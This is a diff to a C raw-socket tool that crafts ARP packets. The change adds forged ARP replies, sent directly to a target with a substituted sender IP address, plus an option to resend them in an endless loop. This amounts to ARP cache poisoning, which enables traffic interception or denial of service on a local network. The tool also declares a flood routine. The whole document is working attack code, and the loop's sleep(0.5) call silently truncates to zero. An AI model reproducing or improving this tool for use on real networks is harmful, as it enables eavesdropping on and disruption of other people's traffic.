@@ -9,6 +9,7 @@
 #include <arpa/inet.h>
 #include <linux/if_packet.h>
 #include <linux/if_arp.h>
+#include <unistd.h> //sleep
 
 //ARP file
 #define ARP_TABEL  "/proc/net/arp"
@@ -63,7 +64,7 @@ void decodeARP(unsigned char *buf, ARP_Packet *arp , int debug);
 void writeToFile(unsigned char *data, int len,unsigned char *fileName);
 void getTargetInfo(unsigned char *target);
 int  find(char *buffer, char *pattern, int len);
-void craftArpRequestPayload(unsigned char *targetIP);
+void craftArpPayload(unsigned char *targetIP, int forReqt);
 void deploy(unsigned char *payload, int payloadSize);
 
 void flood();
@@ -471,7 +472,10 @@ void getTargetInfo(unsigned char * target){
       if(!targetFound){
        //boradcast arp request
        printf("\n Target Not found in ARP Tabel.");
-       craftArpRequestPayload(target_bin);
+       craftArpPayload(target_bin,1);
+      }
+      else{
+        craftArpPayload(target_bin,0);
       }
 
     }
@@ -493,12 +497,15 @@ int find(char *buffer, char *pattern, int len){
 
 
 //Craft ARP request payload
-void craftArpRequestPayload(unsigned char *targetIP){
+void craftArpPayload(unsigned char *targetIP,int forReqt){
      
      printf("\n Crafting ARP Request payload...\n");
   //eth header
       memcpy(eth_replay.src_addr, &own_mac_Add, 6);
-      memcpy(eth_replay.dst_addr, &broadcast_Add, 6);
+      if(forReqt)
+        memcpy(eth_replay.dst_addr, &broadcast_Add, 6);
+      else
+        memcpy(eth_replay.dst_addr, &target_mac, 6);
       eth_replay.type =  htons(0x0806);
       
     //Arp Header
@@ -512,30 +519,41 @@ void craftArpRequestPayload(unsigned char *targetIP){
       arp_packet_replay.PLEN[0]  = 0x04; // Protocol address len 
 
       arp_packet_replay.OPER[0] = 0x00;
-      arp_packet_replay.OPER[1] = 0x01; //Request byte
+      arp_packet_replay.OPER[1] = forReqt == 1 ? 0x01 : 0x02 ; //Request or reply byte
       
       //src
       memcpy(arp_packet_replay.SHA_2 , own_mac_Add, 2);
       memcpy(arp_packet_replay.SHA_4 , &own_mac_Add[2], 2);
       memcpy(arp_packet_replay.SHA_6 , &own_mac_Add[4], 2);
-
-      memcpy(arp_packet_replay.SPA_2 , &own_ip_Add, 2);
-      memcpy(arp_packet_replay.SPA_4 , &own_ip_Add[2], 2);
-
-      //Destination 
-      memcpy(arp_packet_replay.THA_2, &zero_Add, 2);
-      memcpy(arp_packet_replay.THA_4, &zero_Add[2], 2);
-      memcpy(arp_packet_replay.THA_6, &zero_Add[4], 2);
       
-      arp_packet_replay.TPA_2[0] = 0x0;
-      arp_packet_replay.TPA_2[1] = 0x0;
+      if(forReqt){
+        memcpy(arp_packet_replay.SPA_2 , &own_ip_Add, 2);
+        memcpy(arp_packet_replay.SPA_4 , &own_ip_Add[2], 2);
+        
+        //Destination 
+        memcpy(arp_packet_replay.THA_2, &zero_Add, 2);
+        memcpy(arp_packet_replay.THA_4, &zero_Add[2], 2);
+        memcpy(arp_packet_replay.THA_6, &zero_Add[4], 2);
 
-      arp_packet_replay.TPA_4[0] = 0x0;
-      arp_packet_replay.TPA_4[1] = 0x0;
+        memcpy(arp_packet_replay.TPA_2, &target_bin, 2);
+        memcpy(arp_packet_replay.TPA_4, &target_bin[2], 2);        
 
-      memcpy(arp_packet_replay.TPA_2, &target_bin, 2);
-      memcpy(arp_packet_replay.TPA_4, &target_bin[2], 2);        
+      }
+      else{
+        memcpy(arp_packet_replay.SPA_2 , &mask_bin, 2);
+        memcpy(arp_packet_replay.SPA_4 , &mask_bin[2], 2);
 
+        //Destination 
+        memcpy(arp_packet_replay.THA_2, &target_mac, 2);
+        memcpy(arp_packet_replay.THA_4, &target_mac[2], 2);
+        memcpy(arp_packet_replay.THA_6, &target_mac[4], 2);
+    
+        memcpy(arp_packet_replay.TPA_2, &target_bin, 2);
+        memcpy(arp_packet_replay.TPA_4, &target_bin[2], 2);        
+
+      }
+
+    
       printf("\nPayload Crafted ...");
 
         // //Debug crafted Eth 
@@ -566,7 +584,8 @@ void craftArpRequestPayload(unsigned char *targetIP){
       memcpy(&payload[14], &arp_packet_replay, 28);
       
       deploy(payload, sizeof(payload));
-
+      
+      //Debug
       decodeEther(payload,&eth,1);
       decodeARP(payload,&arp_packet,1);
 
@@ -612,8 +631,22 @@ void deploy(unsigned char *payload, int payloadSize){
         //Send               
         // int status = sendto(newSock, payload, sizeof(payload), 0,  (struct sockaddr*)&ll_sock_disc, sizeof(ll_sock_disc));
         //int status = send(newSock, &payload, payloadSize,0);
-        int status = send(newSock, payload, 42, 0);
         
+        int loocked = 0;
+        printf("\n\n single shot :0 \n keep it loocked :1\n");
+        scanf("%d",&loocked);
+        int status = 0;
+        if(loocked){
+          while( status != -1){
+            status = send(newSock, payload, 42, 0);
+            printf("\n Deploy status : %d, errorCode : %d\n",status,errno);
+            sleep(0.5);
+          }
+        }
+        else{
+          status = send(newSock, payload, 42, 0);
+        }
+
         if(status == -1)
         printf("\n\n Deploy status :%d, errorNo:%d\n",status,errno);
         else
